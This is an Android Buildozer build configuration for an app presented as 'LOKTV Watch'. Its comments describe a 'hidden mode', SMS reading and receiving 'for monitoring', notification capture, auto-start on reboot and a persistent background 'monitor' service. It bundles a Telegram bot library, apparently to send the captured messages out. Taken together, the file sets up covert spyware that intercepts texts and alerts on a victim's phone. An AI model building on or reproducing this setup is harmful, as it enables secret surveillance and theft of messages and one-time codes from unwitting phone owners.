[app]

# (str) Title of your application
title = LOKTV Watch

# (str) Package name
package.name = loktvwatch

# (str) Package domain (needed for android packaging)
package.domain = org.loktv.mod

# (str) Source code where the main.py lives
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 1.0

# (list) Application requirements
# CAUTION: pyjnius and android are needed for the hidden mode
requirements = python3,kivy,pyTelegramBotAPI,android,pyjnius

# (list) Permissions
# READ_SMS and RECEIVE_SMS for monitoring
# POST_NOTIFICATIONS for catching alerts
# RECEIVE_BOOT_COMPLETED for auto-start when phone reboots
android.permissions = READ_SMS, RECEIVE_SMS, POST_NOTIFICATIONS, INTERNET, RECEIVE_BOOT_COMPLETED

# (int) Target Android API, should be as high as possible.
android.api = 33

# (int) Minimum API your APK will support.
android.minapi = 21

# (str) Android NDK version to use
android.ndk = 25b

# (bool) Use --private data storage (True) or --dir public storage (False)
android.private_storage = True

# (list) List of service to declare
# This keeps the app running in background
services = monitor:main.py

# (str) Android logcat filters to use
android.logcat_filters = *:S python:D

# (str) Android entry point, default is ok for Kivy-based app
android.entrypoint = org.kivy.android.PythonActivity

# (str) Full name including package path of the Java class that implements Android Activity
# android.activity_class_name = org.kivy.android.PythonActivity

# (bool) If True, then skip trying to update the libs of the project when adding new platforms.
# android.skip_update = False

# (bool) If True, then the downloads info during build will be kept.
# android.keep_data = False

# (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.archs = arm64-v8a, armeabi-v7a

# (bool) enables Android auto backup feature (requires API >= 23)
android.allow_backup = True

[buildozer]

# (int) Log level (0 = error only, 1 = info, 2 = debug (with command output))
log_level = 2

# (int) Display warning if buildozer is run as root (0 = off, 1 = on)
warn_on_root = 1
